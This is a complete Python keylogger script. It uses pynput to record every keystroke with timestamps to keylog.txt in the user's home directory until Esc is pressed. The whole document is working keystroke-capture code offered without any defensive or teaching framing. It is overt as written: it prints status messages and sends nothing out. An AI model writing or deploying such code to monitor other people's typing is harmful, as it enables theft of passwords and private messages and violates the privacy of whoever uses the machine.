from pynput import keyboard
import os
import logging
from datetime import datetime

log_dir = os.path.expanduser("~")
log_file = os.path.join(log_dir, "keylog.txt")

logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s',
)

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        print("Escape key pressed, stopping keylogger.")
        return False

def run_keylogger():
    print("Starting keylogger... Press 'Esc' to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    run_keylogger()
    print(f"Keystrokes are being logged to: {log_file}")
